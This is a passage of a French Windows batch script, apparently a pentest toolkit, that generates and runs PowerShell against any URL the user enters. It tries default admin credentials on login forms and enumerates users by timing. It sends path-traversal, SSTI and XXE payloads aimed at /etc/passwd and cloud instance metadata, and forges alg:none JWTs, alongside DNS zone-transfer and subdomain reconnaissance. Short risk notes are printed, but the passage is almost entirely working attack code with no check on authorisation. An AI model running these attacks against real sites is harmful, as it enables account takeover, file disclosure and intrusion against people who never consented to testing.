echo.
echo  ===========================================================
echo   TEST AUTHENTIFICATION ET GESTION DES SESSIONS
echo  ===========================================================
echo   Audit du systeme d'entree : mots de passe
echo   par defaut et protections anti-brute.
echo.
echo  Entrez l'URL de la page de login (ex: https://site.com/login)
set "ALEEX_AUTH_URL="
set /p "ALEEX_AUTH_URL=URL : "
if not defined ALEEX_AUTH_URL goto net_cyber_menu

echo  Nom du champ utilisateur (ex: username, email, login)
set "ALEEX_AUTH_USER_FIELD="
set /p "ALEEX_AUTH_USER_FIELD=User Field : "

echo  Nom du champ mot de passe (ex: password, pass, pwd)
set "ALEEX_AUTH_PASS_FIELD="
set /p "ALEEX_AUTH_PASS_FIELD=Pass Field : "

set "ATS=%TEMP%\auth_test.ps1"
if exist "%ATS%" del /f /q "%ATS%"

echo $url = $env:ALEEX_AUTH_URL >> "%ATS%"
echo $ua  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" >> "%ATS%"
echo $uf  = $env:ALEEX_AUTH_USER_FIELD >> "%ATS%"
echo $pf  = $env:ALEEX_AUTH_PASS_FIELD >> "%ATS%"
echo $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession >> "%ATS%"
echo. >> "%ATS%"
echo # === TEST 1 : Default credentials === >> "%ATS%"
echo Write-Host "  [1/5] Test des credentials par defaut..." -f Blue >> "%ATS%"
echo $defCreds = @( >> "%ATS%"
echo    @{u='admin';p='admin'}, @{u='admin';p='password'}, @{u='admin';p='123456'}, >> "%ATS%"
echo    @{u='admin';p='admin123'}, @{u='admin';p=''}, @{u='root';p='root'}, >> "%ATS%"
echo    @{u='administrator';p='administrator'}, @{u='test';p='test'}, >> "%ATS%"
echo    @{u='guest';p='guest'}, @{u='user';p='user'}, @{u='demo';p='demo'} >> "%ATS%"
echo ) >> "%ATS%"
echo $baseR = Invoke-WebRequest $url -UserAgent $ua -WebSession $session -TimeoutSec 10 -ErrorAction SilentlyContinue -UseBasicParsing >> "%ATS%"
echo $baseLen = if($baseR){$baseR.RawContentLength}else{0} >> "%ATS%"
echo $baseTitle = if($baseR -and $baseR.Content -match '^<title^>(.*?)^</title^>'){$matches[1]}else{''} >> "%ATS%"
echo Write-Host "  Baseline page login : $baseLen bytes (Titre: $baseTitle)" -f Gray >> "%ATS%"
echo. >> "%ATS%"
echo foreach ($cred in $defCreds) { >> "%ATS%"
echo    $body = @{ $uf = $cred.u; $pf = $cred.p } >> "%ATS%"
echo    try { >> "%ATS%"
echo        $r = Invoke-WebRequest $url -Method POST -Body $body -UserAgent $ua -WebSession $session -TimeoutSec 8 -ErrorAction Stop -UseBasicParsing -MaximumRedirection 5 >> "%ATS%"
echo        $title = if($r.Content -match '^<title^>(.*?)^</title^>'){$matches[1]}else{''} >> "%ATS%"
echo        $lenDiff = [math]::Abs($r.RawContentLength - $baseLen) >> "%ATS%"
echo        $isRedirected = $r.BaseResponse.ResponseUri.AbsoluteUri -ne $url >> "%ATS%"
echo        $hasLogout = $r.Content -match 'logout^|deconnex^|signout^|se.d.connecter' >> "%ATS%"
echo        $hasError  = $r.Content -match 'incorrect^|invalid^|wrong^|error^|erreur^|incorrect' >> "%ATS%"
echo        if ($isRedirected -or $hasLogout -or ($lenDiff -gt 200 -and -not $hasError)) { >> "%ATS%"
echo            Write-Host "  [!!!] CONNEXION REUSSIE ! $($cred.u) / $($cred.p) -> $title" -f Red >> "%ATS%"
echo        } else { >> "%ATS%"
echo            Write-Host "  [ ] $($cred.u)/$($cred.p) -> Echec" -f DarkGray >> "%ATS%"
echo        } >> "%ATS%"
echo    } catch {} >> "%ATS%"
echo } >> "%ATS%"
echo. >> "%ATS%"
echo # === TEST 2 : Enumeration utilisateurs (timing) === >> "%ATS%"
echo Write-Host "  [2/5] Enumeration utilisateurs via timing..." -f Blue >> "%ATS%"
echo $testUsers = @('admin','administrator','root','user','test','contact@' + ([uri]$url).Host) >> "%ATS%"
echo $timings = @() >> "%ATS%"
echo foreach ($u in $testUsers) { >> "%ATS%"
echo    $body = @{ $uf = $u; $pf = 'wrongpassword_xyz_123' } >> "%ATS%"
echo    $start = Get-Date >> "%ATS%"
echo    try { $null = Invoke-WebRequest $url -Method POST -Body $body -UserAgent $ua -TimeoutSec 10 -ErrorAction SilentlyContinue -UseBasicParsing } catch {} >> "%ATS%"
echo    $elapsed = [math]::Round(((Get-Date) - $start).TotalMilliseconds) >> "%ATS%"
echo    $timings += @{User=$u; Ms=$elapsed} >> "%ATS%"
echo    Write-Host "  $u : ${elapsed}ms" -f Gray >> "%ATS%"
echo } >> "%ATS%"
echo $avg = ($timings | Measure-Object -Property Ms -Average).Average >> "%ATS%"
echo $timings | Where-Object { $_.Ms -gt ($avg * 1.5) } | ForEach-Object { >> "%ATS%"
echo    Write-Host "  [!] Utilisateur potentiellement valide (timing +50%%) : $($_.User) ($($_.Ms)ms vs avg $([math]::Round($avg))ms)" -f Yellow >> "%ATS%"
echo } >> "%ATS%"
echo. >> "%ATS%"
echo # === TEST 3 : Headers de securite session === >> "%ATS%"
echo Write-Host "  [3/5] Analyse des cookies et headers de session..." -f Blue >> "%ATS%"
echo $r3 = Invoke-WebRequest $url -UserAgent $ua -TimeoutSec 8 -ErrorAction SilentlyContinue -UseBasicParsing >> "%ATS%"
echo if ($r3) { >> "%ATS%"
echo    $cookies = $session.Cookies.GetCookies($url) >> "%ATS%"
echo    foreach ($c in $cookies) { >> "%ATS%"
echo        Write-Host "  Cookie : $($c.Name) = $($c.Value.Substring(0,[math]::Min(30,$c.Value.Length)))..." -f Cyan >> "%ATS%"
echo        if (-not $c.HttpOnly) { Write-Host "    [!] Sans HttpOnly -> XSS possible" -f Yellow } >> "%ATS%"
echo        if (-not $c.Secure)   { Write-Host "    [!] Sans Secure -> Interception possible" -f Yellow } >> "%ATS%"
echo        if ($c.Name -match 'sess^|sid^|token^|auth') { >> "%ATS%"
echo            $len = $c.Value.Length >> "%ATS%"
echo            if ($len -lt 32) { Write-Host "    [!] Token court ($len chars) -> Entropie faible" -f Yellow } >> "%ATS%"
echo        } >> "%ATS%"
echo    } >> "%ATS%"
echo    # CSRF token present ? >> "%ATS%"
echo    if ($r3.Content -match 'csrf^|_token^|authenticity_token') { >> "%ATS%"
echo        Write-Host "  [OK] Token CSRF detecte dans le formulaire." -f Green >> "%ATS%"
echo    } else { >> "%ATS%"
echo        Write-Host "  [!] Aucun token CSRF detecte -> Formulaire potentiellement vulnerable" -f Yellow >> "%ATS%"
echo    } >> "%ATS%"
echo } >> "%ATS%"
echo. >> "%ATS%"
echo # === TEST 4 : Bruteforce protection === >> "%ATS%"
echo Write-Host "  [4/5] Detection protection bruteforce (5 tentatives)..." -f Blue >> "%ATS%"
echo $blocked = $false >> "%ATS%"
echo for ($i = 1; $i -le 5; $i++) { >> "%ATS%"
echo    $body = @{ $uf = 'admin'; $pf = "wrongpass$i" } >> "%ATS%"
echo    try { >> "%ATS%"
echo        $r4 = Invoke-WebRequest $url -Method POST -Body $body -UserAgent $ua -TimeoutSec 8 -ErrorAction Stop -UseBasicParsing >> "%ATS%"
echo        if ($r4.StatusCode -eq 429 -or $r4.Content -match 'captcha^|trop de tentatives^|too many^|locked^|bloque') { >> "%ATS%"
echo            Write-Host "  [OK] Protection bruteforce activee apres $i tentatives !" -f Green >> "%ATS%"
echo            $blocked = $true; break >> "%ATS%"
echo        } >> "%ATS%"
echo    } catch { if ($_.Exception.Response.StatusCode -eq 429) { $blocked = $true; break } } >> "%ATS%"
echo } >> "%ATS%"
echo if (-not $blocked) { Write-Host "  [!] Aucune protection bruteforce detectee apres 5 tentatives." -f Yellow } >> "%ATS%"
echo. >> "%ATS%"
echo # === TEST 5 : Path traversal on page login === >> "%ATS%"
echo Write-Host "  [5/5] Test Path Traversal sur parametres..." -f Blue >> "%ATS%"
echo $traversalPayloads = @('../etc/passwd', '../../etc/passwd', '../../../etc/passwd', '..\..\windows\system32\drivers\etc\hosts', '%%2e%%2e%%2fetc%%2fpasswd') >> "%ATS%"
echo foreach ($tp in $traversalPayloads) { >> "%ATS%"
echo    $body = @{ $uf = $tp; $pf = 'test' } >> "%ATS%"
echo    try { >> "%ATS%"
echo        $r5 = Invoke-WebRequest $url -Method POST -Body $body -UserAgent $ua -TimeoutSec 6 -ErrorAction Stop -UseBasicParsing >> "%ATS%"
echo        if ($r5.Content -match 'root:x:^|daemon:^|bin:^|nobody:' -or $r5.Content -match '# Copyright^|# localhost') { >> "%ATS%"
echo            Write-Host "  [!!!] PATH TRAVERSAL ! Fichier systeme lu via param [$uf]" -f Red >> "%ATS%"
echo        } >> "%ATS%"
echo    } catch {} >> "%ATS%"
echo } >> "%ATS%"
echo. >> "%ATS%"
echo Write-Host "  Audit authentification termine." -f Cyan >> "%ATS%"
echo Write-Host "" >> "%ATS%"
echo Write-Host "  [!] ANALYSE DES RISQUES (Comptes) :" -f Red >> "%ATS%"
echo Write-Host "  1. Brute-force : Si aucune protection n'est active, tous les comptes sont a risque." -f Yellow >> "%ATS%"
echo Write-Host "  2. Session : Des cookies sans flags facilitent le piratage de compte (XSS/MITM)." -f Yellow >> "%ATS%"
echo Write-Host "  3. Default Creds : Un admin/admin permet le controle TOTAL du site." -f Yellow >> "%ATS%"
echo Write-Host "  CONSEIL : Activez la MFA et configurez correctement vos cookies de session." -f Cyan >> "%ATS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%ATS%"
if exist "%ATS%" del "%ATS%"
echo.
pause
goto net_cyber_menu

:cyber_pentest_report
cls
echo.
echo  ===========================================================
echo   RAPPORT PENTEST HTML UNIFIE
echo  ===========================================================
echo   Genere un rapport HTML professionnel avec
echo   score et liste des vulnerabilites.
echo.
set /p "TARGET_URL=URL cible principale : "
set /p "TARGET_DOMAIN=Domaine (sans https) : "
if "%TARGET_URL%"=="" goto net_cyber_menu

set "RPT_PS=%TEMP%\pentest_report.ps1"
if exist "%RPT_PS%" del "%RPT_PS%"

echo $url = "!TARGET_URL!" > "%RPT_PS%"
echo $domain = "!TARGET_DOMAIN!" >> "%RPT_PS%"
echo $reportFile = "$([Environment]::GetFolderPath('Desktop'))\Pentest_Report_$($domain)_$(Get-Date -Format 'yyyyMMdd_HHmm').html" >> "%RPT_PS%"
echo $score = 100 >> "%RPT_PS%"
echo $findings = @() >> "%RPT_PS%"
echo. >> "%RPT_PS%"
echo function Add-Finding($sev, $cat, $msg, $pts) { >> "%RPT_PS%"
echo    $script:score -= $pts >> "%RPT_PS%"
echo    $script:findings += [PSCustomObject]@{ Severite=$sev; Categorie=$cat; Description=$msg } >> "%RPT_PS%"
echo } >> "%RPT_PS%"
echo. >> "%RPT_PS%"
echo Write-Host "--- Diagnostic Securite en cours pour $url ---" -f Cyan >> "%RPT_PS%"
echo. >> "%RPT_PS%"
echo # 1. Headers ^& Cookies >> "%RPT_PS%"
echo try { >> "%RPT_PS%"
echo    $r = Invoke-WebRequest $url -Method Get -TimeoutSec 10 -ErrorAction Stop -UseBasicParsing >> "%RPT_PS%"
echo    $h = $r.Headers >> "%RPT_PS%"
echo    if (-not $h['Content-Security-Policy']) { Add-Finding 'MEDIUM' 'Headers' 'CSP manquant' 10 } >> "%RPT_PS%"
echo    if (-not $h['X-Frame-Options']) { Add-Finding 'LOW' 'Headers' 'X-Frame-Options manquant (Clickjacking)' 5 } >> "%RPT_PS%"
echo    if ($h['Server']) { Add-Finding 'INFO' 'Infos' "Version serveur exposee : $($h['Server'])" 0 } >> "%RPT_PS%"
echo    if ($h['X-Powered-By']) { Add-Finding 'INFO' 'Infos' "Technologie exposee : $($h['X-Powered-By'])" 0 } >> "%RPT_PS%"
echo    $cookies = $r.Headers['Set-Cookie'] >> "%RPT_PS%"
echo    if ($cookies) { >> "%RPT_PS%"
echo        if ($cookies -notmatch 'HttpOnly') { Add-Finding 'MEDIUM' 'Cookies' 'Cookie(s) sans flag HttpOnly' 10 } >> "%RPT_PS%"
echo        if ($cookies -notmatch 'Secure') { Add-Finding 'MEDIUM' 'Cookies' 'Cookie(s) sans flag Secure' 10 } >> "%RPT_PS%"
echo        if ($cookies -notmatch 'SameSite') { Add-Finding 'LOW' 'Cookies' 'Cookie(s) sans flag SameSite' 5 } >> "%RPT_PS%"
echo    } >> "%RPT_PS%"
echo } catch { Write-Host "[!] Erreur lors de l'analyse des headers." -f Red } >> "%RPT_PS%"
echo. >> "%RPT_PS%"
echo # 2. SSL/TLS >> "%RPT_PS%"
echo if ($url -like 'https*') { >> "%RPT_PS%"
echo    try { >> "%RPT_PS%"
echo        $req = [Net.HttpWebRequest]::Create($url); $res = $req.GetResponse(); $cert = $req.ServicePoint.Certificate >> "%RPT_PS%"
echo        $expiry = [DateTime]::Parse($cert.GetExpirationDateString()) >> "%RPT_PS%"
echo        if ($expiry -lt (Get-Date).AddDays(30)) { Add-Finding 'HIGH' 'SSL' "Le certificat expire bientot ($expiry)" 20 } >> "%RPT_PS%"
echo        $res.Close() >> "%RPT_PS%"
echo    } catch { Add-Finding 'CRITICAL' 'SSL' 'Certificat SSL invalide ou expire' 40 } >> "%RPT_PS%"
echo } >> "%RPT_PS%"
echo. >> "%RPT_PS%"
echo # 3. Fichiers sensibles >> "%RPT_PS%"
echo $critPaths = @('/.env', '/.git/config', '/wp-config.php', '/config.php', '/phpinfo.php', '/.htaccess') >> "%RPT_PS%"
echo foreach ($p in $critPaths) { >> "%RPT_PS%"
echo    try { >> "%RPT_PS%"
echo        $tr = Invoke-WebRequest ($url.TrimEnd('/') + $p) -Method Get -TimeoutSec 3 -ErrorAction Stop -UseBasicParsing >> "%RPT_PS%"
echo        if ($tr.StatusCode -eq 200) { Add-Finding 'CRITICAL' 'Fichiers' "Fichier sensible accessible : $p" 30 } >> "%RPT_PS%"
echo    } catch {} >> "%RPT_PS%"
echo } >> "%RPT_PS%"
echo. >> "%RPT_PS%"
echo # 4. CORS ^& Methodes >> "%RPT_PS%"
echo try { >> "%RPT_PS%"
echo    $cors = Invoke-WebRequest $url -Method Get -Headers @{Origin='https://evil.com'} -TimeoutSec 5 -ErrorAction SilentlyContinue -UseBasicParsing >> "%RPT_PS%"
echo    if ($cors.Headers['Access-Control-Allow-Origin'] -eq '*') { Add-Finding 'MEDIUM' 'Config' 'CORS permissif (*)' 15 } >> "%RPT_PS%"
echo } catch {} >> "%RPT_PS%"
echo. >> "%RPT_PS%"
echo # 5. Injection de base (SSTI Check) >> "%RPT_PS%"
echo try { >> "%RPT_PS%"
echo    $sstiUrl = $url + '?id={{7*7}}' >> "%RPT_PS%"
echo    $sr = Invoke-WebRequest $sstiUrl -TimeoutSec 5 -ErrorAction SilentlyContinue -UseBasicParsing >> "%RPT_PS%"
echo    if ($sr.Content -match '49') { Add-Finding 'CRITICAL' 'Injection' 'SSTI (Server-Side Template Injection) detecte' 50 } >> "%RPT_PS%"
echo } catch {} >> "%RPT_PS%"
echo. >> "%RPT_PS%"
echo # Generation HTML >> "%RPT_PS%"
echo $html = @" >> "%RPT_PS%"
echo ^<!DOCTYPE html^>^<html lang='fr'^>^<head^>^<meta charset='UTF-8'^>^<title^>Rapport Pentest - $domain^</title^> >> "%RPT_PS%"
echo ^<style^>body{font-family:Sans-Serif;background:#0d1117;color:#e6edf3;padding:20px}h1{color:#58a6ff}table{width:100%%;border-collapse:collapse}th{background:#161b22;padding:10px;text-align:left}td{padding:10px;border-bottom:1px solid #21262d}.HIGH{color:#f85149;font-weight:bold}.MEDIUM{color:#dbab09}.LOW{color:#3fb950}.CRITICAL{background:#f85149;color:white;padding:2px 5px;border-radius:3px}^</style^>^</head^>^<body^> >> "%RPT_PS%"
echo ^<h1^>Rapport Pentest : $domain^</h1^>^<p^>Genere le $(Get-Date)^</p^> >> "%RPT_PS%"
echo ^<h2^>Score de Securite : $script:score / 100^</h2^> >> "%RPT_PS%"
echo ^<table^>^<tr^>^<th^>Severite^</th^>^<th^>Categorie^</th^>^<th^>Description^</th^>^</tr^> >> "%RPT_PS%"
echo "@ >> "%RPT_PS%"
echo foreach ($f in $findings) { $html += "^<tr^>^<td class='$($f.Severite)'^>$($f.Severite)^</td^>^<td^>$($f.Categorie)^</td^>^<td^>$($f.Description)^</td^>^</tr^>" } >> "%RPT_PS%"
echo $html += "^</table^>^</body^>^</html^>" >> "%RPT_PS%"
echo $html ^| Out-File $reportFile -Encoding UTF8 >> "%RPT_PS%"
echo Write-Host "`n[OK] Rapport genere : $reportFile" -f Green >> "%RPT_PS%"
echo Start-Process $reportFile >> "%RPT_PS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%RPT_PS%"
if exist "%RPT_PS%" del "%RPT_PS%"
pause
goto net_cyber_menu

:cyber_advanced_inject
cls
echo.
echo  ===========================================================
echo   INJECTIONS AVANCEES (SSTI / XXE / JWT)
echo  ===========================================================
echo.
set "opts=SSTI (Server-Side Template Injection)~Injection de moteurs de templates (Jinja2, Twig, EL...);XXE (XML External Entity)~Vulnerabilite de parsing XML (File read, SSRF);JWT Attack (JSON Web Token)~Analyse, Brute-force secret et Alg:None"
call :DynamicMenu "CHOIX DU VECTEUR D'INJECTION" "%opts%"
set "inject_c=%errorlevel%"
if "%inject_c%"=="0" goto net_cyber_menu
if "%inject_c%"=="1" goto adv_ssti
if "%inject_c%"=="2" goto adv_xxe
if "%inject_c%"=="3" goto adv_jwt
goto cyber_advanced_inject

:adv_ssti
cls
echo.
echo  [SSTI] Testeur de moteurs de templates...
set /p "ST_URL=URL cible (ex: https://site.com/search?q=) : "
if "%ST_URL%"=="" goto cyber_advanced_inject
powershell -NoProfile -Command "$u='!ST_URL!'; $payloads=@{ 'Jinja2/Python'='{{7*7}}'; 'Twig/PHP'='{{7*7}}'; 'Freemarker'='${7*7}'; 'EL/Java'='${7*7}'; 'ERB/EJS'='^<%%= 7*7 %%^>'; 'Ruby Slim'='#{7*7}'; 'Spring/Thymeleaf'='__${7*7}__' }; foreach($k in $payloads.Keys){ $test=$u+$payloads[$k]; try { $r=Invoke-WebRequest $test -TimeoutSec 5 -UseBasicParsing; if($r.Content -match '49'){ Write-Host \"  [VULN] SSTI Potentiel ($k) avec payload: $($payloads[$k])\" -f Red } } catch {} }"
pause & goto cyber_advanced_inject

:adv_xxe
cls
echo.
echo  [XXE] Testeur d'entites externes XML...
set /p "XXE_URL=URL de l'endpoint XML (POST) : "
if "%XXE_URL%"=="" goto cyber_advanced_inject
powershell -NoProfile -Command "$u='!XXE_URL!'; $payloads=@( \"^<?xml version='1.0' encoding='ISO-8859-1'?^>^<!DOCTYPE foo [^<!ELEMENT foo ANY ^>^<!ENTITY xxe SYSTEM 'file:///etc/passwd' ^>]^>^<foo^>^&xxe;^</foo^>\", \"^<?xml version='1.0'?^>^<!DOCTYPE r [^<!ENTITY %% asd SYSTEM 'http://169.254.169.254/latest/meta-data/'^> %%asd;]^>^<r^>test^</r^>\" ); foreach($p in $payloads){ try { $r=Invoke-WebRequest $u -Method Post -Body $p -ContentType 'application/xml' -TimeoutSec 5 -UseBasicParsing; if($r.Content -match 'root:x:' -or $r.Content -match 'ami-id'){ Write-Host \"  [VULN] XXE Detecte !\" -f Red; Write-Host $r.Content.Substring(0,100) -f Gray } } catch {} }"
pause & goto cyber_advanced_inject

:adv_jwt
cls
echo.
echo  [JWT] Analyse et Attaque de tokens...
set /p "JWT_TOKEN=Entrez le token JWT : "
if "%JWT_TOKEN%"=="" goto cyber_advanced_inject
powershell -NoProfile -Command "$t='!JWT_TOKEN!'; $parts=$t.Split('.'); if($parts.Count -ne 3){ Write-Host 'JWT Invalide' -f Red; exit }; $header=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($parts[0].PadRight($parts[0].Length + (4 - $parts[0].Length %% 4) %% 4, '='))); $payload=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($parts[1].PadRight($parts[1].Length + (4 - $parts[1].Length %% 4) %% 4, '='))); Write-Host 'Header  : ' -NoNewline -f Cyan; Write-Host $header; Write-Host 'Payload : ' -NoNewline -f Cyan; Write-Host $payload; if($header -match '\"alg\":\"none\"'){ Write-Host '[ALERTE] Algorithme none detecte !' -f Red } else { $noneH=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('{\"alg\":\"none\",\"typ\":\"JWT\"}')).Replace('=',''); Write-Host \"Forge Alg:None -> $($noneH).$($parts[1]).\" -f Yellow }"
pause & goto cyber_advanced_inject

:cyber_recon_advanced
goto cat_recon

:recon_whois
cls
echo.
echo  ================================================
echo   [WHOIS] INFORMATION DE DOMAINE ET ASN
echo  ================================================
echo   Analyse le proprietaire, le bureau
echo   d'enregistrement et l'ASN de l'herbergeur.
echo.
set "WH_DOM="
set /p "WH_DOM=Domaine ou IP : "
if not defined WH_DOM goto cat_recon

set "WPS=%TEMP%\recon_whois_%RANDOM%.ps1"
if exist "%WPS%" del /f /q "%WPS%"

echo $d = $env:WH_DOM >> "%WPS%"
echo Write-Host "--- WHOIS-IP Info ($d) ---" -f Cyan >> "%WPS%"
echo try { >> "%WPS%"
echo     $ip = [System.Net.Dns]::GetHostAddresses($d)[0].IPAddressToString >> "%WPS%"
echo     Write-Host "  Ressource resolue : $ip" -f Gray >> "%WPS%"
echo     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 >> "%WPS%"
echo     $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" >> "%WPS%"
echo     $api_url = "http://ip-api.com/json/$($ip)?lang=fr" >> "%WPS%"
echo     $info = Invoke-RestMethod -Uri $api_url -UserAgent $ua -TimeoutSec 10 >> "%WPS%"
echo     function NoAcc($s) { >> "%WPS%"
echo         if ($null -eq $s) { return "" } >> "%WPS%"
echo         $s = $s.ToString() >> "%WPS%"
echo         $s = $s -replace [char]244,'o' -replace [char]233,'e' -replace [char]232,'e' >> "%WPS%"
echo         $s = $s -replace [char]224,'a' -replace [char]231,'c' -replace [char]234,'e' >> "%WPS%"
echo         $s = $s -replace [char]251,'u' -replace [char]238,'i' >> "%WPS%"
echo         return $s >> "%WPS%"
echo     } >> "%WPS%"
echo     Write-Host "" >> "%WPS%"
echo     Write-Host ("  Adresse IP   : " + $info.query) -f Cyan >> "%WPS%"
echo     Write-Host ("  Ville        : " + (NoAcc $info.city)) -f Gray >> "%WPS%"
echo     Write-Host ("  Region       : " + (NoAcc $info.regionName)) -f Gray >> "%WPS%"
echo     Write-Host ("  Pays         : " + (NoAcc $info.country)) -f Gray >> "%WPS%"
echo     Write-Host ("  Organisation : " + (NoAcc $info.org)) -f Gray >> "%WPS%"
echo     Write-Host ("  FAI          : " + (NoAcc $info.isp)) -f Gray >> "%WPS%"
echo     Write-Host ("  Fuseau       : " + $info.timezone) -f Gray >> "%WPS%"
echo     Write-Host "" >> "%WPS%"
echo     Write-Host "  [!] RISQUES ET CONSEQUENCES :" -f Red >> "%WPS%"
echo     Write-Host "  1. Geolocation : Permet de cibler physiquement l'infrastructure." -f Yellow >> "%WPS%"
echo     Write-Host "  2. Attribution : Identifie l'herbergeur (ex: AWS, OVH) et ses failles connues." -f Yellow >> "%WPS%"
echo     Write-Host "  3. Social Engineering : Les infos WHOIS facilitent l'usurpation d'identite." -f Yellow >> "%WPS%"
echo } catch { >> "%WPS%"
echo     Write-Host "  [!] Erreur de connexion ou domaine introuvable." -f Yellow >> "%WPS%"
echo } >> "%WPS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%WPS%"
if exist "%WPS%" del /f /q "%WPS%"
pause & goto cat_recon

:recon_crtsh
cls
echo.
echo  ================================================
echo   [crt.sh] RECHERCHE VIA CERTIFICATS SSL
echo  ================================================
echo   Trouve les sous-domaines enregistres
echo   dans les logs publics (methode 100%% passive).
echo.
set "CRT_DOM="
set /p "CRT_DOM=Domaine cible (ex: google.com) : "
if not defined CRT_DOM goto cat_recon
set "CRT_DOM=%CRT_DOM: =%"

set "WPS=%TEMP%\recon_crtsh_%RANDOM%.ps1"
if exist "%WPS%" del /f /q "%WPS%"
echo $d = $env:CRT_DOM >> "%WPS%"
echo $url = "https://crt.sh/?q=%%.$d&output=json" >> "%WPS%"
echo Write-Host "  Interrogation de crt.sh pour $d ..." -f Cyan >> "%WPS%"
echo try { >> "%WPS%"
echo     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 >> "%WPS%"
echo     $r = Invoke-WebRequest $url -TimeoutSec 20 -UseBasicParsing -EA Stop >> "%WPS%"
echo     $json = $r.Content ^| ConvertFrom-Json >> "%WPS%"
echo     if ($json.Count -eq 0) { Write-Host "  [i] Aucun sous-domaine trouve." -f Yellow; exit } >> "%WPS%"
echo     $names = $json ^| Select-Object -ExpandProperty common_name -Unique ^| Sort-Object >> "%WPS%"
echo     Write-Host "  [+] $($names.Count) sous-domaines trouves :" -f Green >> "%WPS%"
echo     foreach ($n in $names) { Write-Host "    - $n" -f Gray } >> "%WPS%"
echo     Write-Host "" >> "%WPS%"
echo     Write-Host "  [!] ANALYSE DES RISQUES (crt.sh) :" -f Red >> "%WPS%"
echo     Write-Host "  1. Reconnaissance passive : L'attaquant voit tout sans jamais toucher le serveur." -f Yellow >> "%WPS%"
echo     Write-Host "  2. Services oublies : Revele des instances de dev ou d'anciennes versions." -f Yellow >> "%WPS%"
echo     Write-Host "  3. Evolution : Permet de deduire la structure interne de l'equipe technique." -f Yellow >> "%WPS%"
echo } catch { >> "%WPS%"
echo     Write-Host "  [ERREUR] Impossible de joindre crt.sh (Timeout ou blocage)." -f Red >> "%WPS%"
echo     Write-Host "  Details : $($_.Exception.Message)" -f Gray >> "%WPS%"
echo } >> "%WPS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%WPS%"
if exist "%WPS%" del /f /q "%WPS%"
pause & goto cat_recon

:recon_axfr
cls
echo.
echo  ================================================
echo   [AXFR] DUMP DES RECORDS DNS (ZONE TRANSFER)
echo  ================================================
echo   Tente de recuperer toute la configuration DNS
echo   si le serveur de noms est mal securise.
echo.
set "AX_DOM="
set /p "AX_DOM=Domaine (ex: zonetransfer.me) : "
if not defined AX_DOM goto cat_recon
set "AX_DOM=%AX_DOM: =%"

set "WPS=%TEMP%\recon_axfr_%RANDOM%.ps1"
if exist "%WPS%" del /f /q "%WPS%"
echo $d = $env:AX_DOM >> "%WPS%"
echo Write-Host "  Recherche des serveurs NameServer (NS) pour $d..." -f Cyan >> "%WPS%"
echo try { >> "%WPS%"
echo     $nsList = Resolve-DnsName $d -Type NS -ErrorAction SilentlyContinue >> "%WPS%"
echo     if (-not $nsList) { Write-Host "  [!] Aucun serveur NS trouve pour ce domaine." -f Red; exit } >> "%WPS%"
echo     $foundAny = $false >> "%WPS%"
echo     foreach ($ns in $nsList.NameHost) { >> "%WPS%"
echo         Write-Host "  --- Test sur $ns ---" -f Yellow >> "%WPS%"
echo         $res = nslookup -type=any -timeout=5 $d $ns ^| Select-String $d >> "%WPS%"
echo         if ($res) { >> "%WPS%"
echo             $foundAny = $true >> "%WPS%"
echo             $res ^| ForEach-Object { Write-Host ("    " + $_.Line) -f Green } >> "%WPS%"
echo         } else { >> "%WPS%"
echo             Write-Host "    [-] Transfert refuse ou aucun record trouve sur ce serveur." -f DarkGray >> "%WPS%"
echo         } >> "%WPS%"
echo     } >> "%WPS%"
echo     if ($foundAny) { >> "%WPS%"
echo         Write-Host "" >> "%WPS%"
echo         Write-Host "  [!] ANALYSE DES RISQUES (DONNEES EXPOSEES) :" -f Red >> "%WPS%"
echo         Write-Host "  1. Fuite d'annuaire : Votre infrastructure est cartographiee." -f Yellow >> "%WPS%"
echo         Write-Host "  2. Services cachés : Des sous-domaines (dev, admin, vpn) sont visibles." -f Yellow >> "%WPS%"
echo         Write-Host "  3. En-tetes Mail/Web : Les IPs des serveurs critiques sont identifiees." -f Yellow >> "%WPS%"
echo         Write-Host "  CONSEIL : Desactivez AXFR ou restreignez-le aux IPs de confiance." -f Cyan >> "%WPS%"
echo     } >> "%WPS%"
echo } catch { >> "%WPS%"
echo     Write-Host "  [ERREUR] Echec de la resolution DNS." -f Red >> "%WPS%"
echo } >> "%WPS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%WPS%"
if exist "%WPS%" del /f /q "%WPS%"
pause & goto cat_recon

:recon_robots
cls
echo.
echo  ================================================
echo   [ROBOTS] ANALYSE DES CHEMINS CACHES
echo  ================================================
echo   Verifie Robots.txt, Sitemap et Security.txt
echo   pour trouver des panels admin caches.
echo.
set "RB_URL="
set /p "RB_URL=URL (ex: https://site.com) : "
if not defined RB_URL goto cat_recon
set "RB_URL=%RB_URL: =%"

set "WPS=%TEMP%\recon_robots_%RANDOM%.ps1"
if exist "%WPS%" del /f /q "%WPS%"
echo $u = $env:RB_URL >> "%WPS%"
echo if ($u -notmatch '^^http') { $u = 'https://' + $u } >> "%WPS%"
echo $u = $u.TrimEnd('/') >> "%WPS%"
echo $paths = @('/robots.txt', '/sitemap.xml', '/.well-known/security.txt') >> "%WPS%"
echo foreach ($p in $paths) { >> "%WPS%"
echo     Write-Host "  [?] Verification de : $p ..." -f Gray >> "%WPS%"
echo     try { >> "%WPS%"
echo         [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12 >> "%WPS%"
echo         $r = Invoke-WebRequest ($u + $p) -TimeoutSec 8 -UseBasicParsing -EA Stop >> "%WPS%"
echo         if ($r.StatusCode -eq 200) { >> "%WPS%"
echo             Write-Host "  [OK] Contenu trouve ! ($p)" -f Green >> "%WPS%"
echo             Write-Host "------------------------------------------------" -f Blue >> "%WPS%"
echo             $r.Content >> "%WPS%"
echo             Write-Host "------------------------------------------------" -f Blue >> "%WPS%"
echo         } >> "%WPS%"
